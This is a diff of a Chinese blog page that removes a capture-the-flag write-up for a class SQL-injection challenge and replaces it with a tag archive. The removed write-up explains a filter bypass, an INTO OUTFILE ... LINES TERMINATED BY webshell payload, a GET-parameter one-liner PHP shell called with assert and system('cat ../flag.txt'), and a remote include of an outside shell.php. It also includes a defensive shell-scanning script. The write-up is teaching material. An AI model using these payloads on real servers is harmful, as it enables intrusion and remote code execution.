@@ -6,19 +6,14 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>sql第三题write_up | Jason&#39;s Blog</title>
+  <title>Tag: dawn | Jason&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="##第三题Write Up&amp;emsp;这次的第三题主要是想练习一下班上同学以下三点知识：   代码审计 sql注入shell的写入 对一句话木马的理解   过滤文件filter.php的代码如下： &amp;lt;?php  function filter($input){     while(preg_match(&amp;apos;/(and|or|union|where|limit|group by|sel">
-<meta name="keywords" content="write_up">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sql第三题write_up">
-<meta property="og:url" content="http://yoursite.com/2017/10/18/sql第三题write-up/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Jason&#39;s Blog">
+<meta property="og:url" content="http://yoursite.com/tags/dawn/index.html">
 <meta property="og:site_name" content="Jason&#39;s Blog">
-<meta property="og:description" content="##第三题Write Up&amp;emsp;这次的第三题主要是想练习一下班上同学以下三点知识：   代码审计 sql注入shell的写入 对一句话木马的理解   过滤文件filter.php的代码如下： &amp;lt;?php  function filter($input){     while(preg_match(&amp;apos;/(and|or|union|where|limit|group by|sel">
-<meta property="og:updated_time" content="2017-10-17T16:54:56.180Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sql第三题write_up">
-<meta name="twitter:description" content="##第三题Write Up&amp;emsp;这次的第三题主要是想练习一下班上同学以下三点知识：   代码审计 sql注入shell的写入 对一句话木马的理解   过滤文件filter.php的代码如下： &amp;lt;?php  function filter($input){     while(preg_match(&amp;apos;/(and|or|union|where|limit|group by|sel">
+<meta name="twitter:title" content="Jason&#39;s Blog">
   
     <link rel="alternative" href="/atom.xml" title="Jason&#39;s Blog" type="application/atom+xml">
   
@@ -151,302 +146,98 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-sql第三题write-up" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      sql第三题write_up
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2017" class="archive-year">2017</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2017/10/16/文件上传/" class="archive-article-date">
+  	<time datetime="2017-10-16T06:47:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-16</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2017/10/16/文件上传/">文件上传</a>
     </h1>
   
 
-        
-        <a href="/2017/10/18/sql第三题write-up/" class="archive-article-date">
-  	<time datetime="2017-10-17T16:54:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>##第三题Write Up<br>&emsp;这次的第三题主要是想练习一下班上同学以下三点知识：</p>
-<blockquote>
-<ul>
-<li>代码审计</li>
-<li>sql注入shell的写入</li>
-<li>对一句话木马的理解</li>
-</ul>
-</blockquote>
-<p>过滤文件filter.php的代码如下：</p>
-<pre><code>&lt;?php
-
-function filter($input){
-    while(preg_match(&apos;/(and|or|union|where|limit|group by|select|hex|substr)/i&apos;,$input)){
-        $input=preg_replace(&apos;/(and|or|union|where|limit|group by|select|hex|substr)/i&apos;,&apos;&apos;,$input);
-    }
-    $array=array(&quot;*&quot;,&quot; &quot;,&quot;-&quot;,&quot;0x&quot;);
-    foreach($array as $str){
-        $input=str_replace($str,&quot;&quot;,$input);
-    }
-    return $input;
-}
-
-function filter_add($input){
-    $filter=preg_match(&apos;/(select.*into)|(limit [0-9]+,[0-9]+)/i&apos;,$input);
-    if($filter){
-        die(&quot;&lt;script&gt;alert(\&quot;emmmm...want to have a webshell?.\&quot;)&lt;/script&gt;&quot;);
-    }
-}
-
-function filter_admin($input){
-    preg_match(&quot;/^[_0-9a-z]{4,25}$/i&quot;,$input) or die(&quot;&lt;script&gt;alert(\&quot;Emmmmm...Your input is out of range or containing illegal parameter.\&quot;)&lt;/script&gt;&quot;);
-}
-?&gt;
-</code></pre><p>在filter函数中，敏感字符串和特殊符号分开进行了过滤，先检查敏感字符串再替换特殊符号为空，仔细思考会发现其存在逻辑漏洞，可以在敏感字符串中插入特殊字符绕过敏感字符串检测，过滤特殊字符后变成正常语句，空格过滤可以用%0a、反引号或者\n绕过，然后就可以进行正常的注入爆数据等，爆出管理员账号密码，密码是多次base64加密的密文，python脚本跑一遍就能得到明文。登陆取得一半flag。</p>
-<p>另一半需写入shell在上级目录读文件获得，在这里用正则过滤了“select into outfile”写shell的方式，但是正则写得不对……被大佬用\n和%0a绕过，这里本来是想让大家了解一下利用“terminated by”写shell的方式，在sqlmap目录下有个写shell的payload：</p>
-<pre><code>LIMIT 0,1 INTO OUTFILE &apos;%OUTFILE%&apos; LINES TERMINATED BY 0x%HEXSTRING%--
-</code></pre><p>与前者稍微不同的是，这个是在查询出数据后在数据中插入我们的一句话木马，因此写shell时前面需能正确查询一条或多条数据，具体可看这篇文章：<a href="http://www.cnblogs.com/qing123/p/6771858.html" target="_blank" rel="external">http://www.cnblogs.com/qing123/p/6771858.html</a></p>
-<p>在后台有一个python脚本会扫生成的shell文件并检测其中的敏感字符串<br>代码如下：</p>
-<pre><code>import os
-
-import re
-
-import time
-
-
-
-dir_list=[&quot;admin.php&quot;,&quot;index.php&quot;,&quot;sql&quot;,&quot;filter.php&quot;,&quot;filter.php.bak&quot;]
-
-dir_list2=[&quot;sql-con-1.php&quot;,&quot;sql-con-2.php&quot;,&quot;sql-con-3.php&quot;]
-
-str=&quot;emmmm,your shell is detected&quot;
-
-
-
-while(1):
-
-    dir=os.listdir(&quot;html/&quot;)
-
-    if len(dir) != len(dir_list):
-
-        for i in dir:
-
-            if i not in dir_list:
-
-                if os.path.isfile(&quot;html/%s&quot; % i):
-
-            dir_list.append(i)
-                    file=open(&quot;html/%s&quot; % i,&apos;r&apos;)
-
-                    try:
-
-                        content=file.read()
-
-                        content=content.lower()
-                        result=re.search(&quot;eval|assert|post|include|require|;&quot;,content)
-
-                        if result != None:
-
-                            print(&apos;shell found&apos;)
-
-                            file.close()
-
-                            file=open(&quot;html/%s&quot; % i,&apos;w&apos;)
-
-                            file.write(str)
-
-                    finally:
-
-                        file.close()
-
-            elif os.path.isdir(&quot;html/%s&quot; % i):
-
-                dir2=os.listdir(&quot;html/%s/&quot; % i)
-
-                for j in dir2:
-
-                    if j not in dir_list2:
-
-                        file = open(&quot;html/%s/%s&quot; % (i,j), &apos;r&apos;)
-
-                        try:
-
-                            content = file.read()
-
-                content=content.lower()
-                            result = re.search(&quot;eval|assert|include|post|require|;&quot;, content)
-
-                            if result != None:
-                print(&apos;shell found&apos;)
-
-                                file.close()
-
-                                file = open(&quot;html/%s/%s&quot; % (i,j), &apos;w&apos;)
-
-                                file.write(str)
-
-                        finally:
-
-                            file.close()
-
-    time.sleep(5)
-</code></pre><p>过滤了eval、assert、post，等关键词，以及分号，同学可以写入免杀且隐蔽的一句话，然后因为检测脚本会sleep 5s，因此也可以通过脚本或者burp在被遍历修改前访问到，想要同学们熟悉的是只有$_GET的shell：</p>
-<pre><code>&lt;?php $_GET[a]($_GET[b])?&gt;
-</code></pre><p>当a=assert时，后面可以执行一句话php代码，因此可以url传参a=assert&amp;b=system(‘cat ../flag.txt’)的方式读到flag，通过拿到第二题后wget或者第三题用load_file可以读到admin源码，可以发现我把密码加密函数文件放到了另外一台docker容器中，并通过远程包含的方式包含include进来：</p>
-<pre><code>include_once(&quot;http://172.17.0.3/level3/flag.php&quot;)
-</code></pre><p>可推测配置中allow_url_include=On，因此可以通过a=assert&amp;b=include(“<a href="http://xxxxx/shell.php" target="_blank" rel="external">http://xxxxx/shell.php</a>“)的方式拿到shell，这也是我在检测脚本中加入include和require检测的原因，避免直接包含了加密文件</p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/alipay.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/weixin.jpg">
-                      <span class="reward-type">微信</span>
-                    </div>
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">write_up</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">dawn</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2017/10/18/sql第三题write-up/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
   
-<nav id="article-nav">
-  
-  
-    <a href="/2017/10/16/文件上传/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">文件上传</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
+    
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2017/10/16/CVE-2013-4547/" class="archive-article-date">
+  	<time datetime="2017-10-16T06:46:00.845Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-16</time>
+</a>
         </div>
-        
-        
-    </div>
-</aside>
-
-
-
+    	 
   
-  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2017/10/16/CVE-2013-4547/">CVE-2013-4547</a>
+    </h1>
   
 
+        <div class="article-info info-on-right">
+          
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">dawn</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+          
+
+        </div>
+        <div class="clearfix"></div>
+    </header>
+  </div>
+</article>
+  
+  
+    </div></section>
   
 
-  
-
-  
+    
 
 
           </div>
@@ -469,9 +260,9 @@ while(1):
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
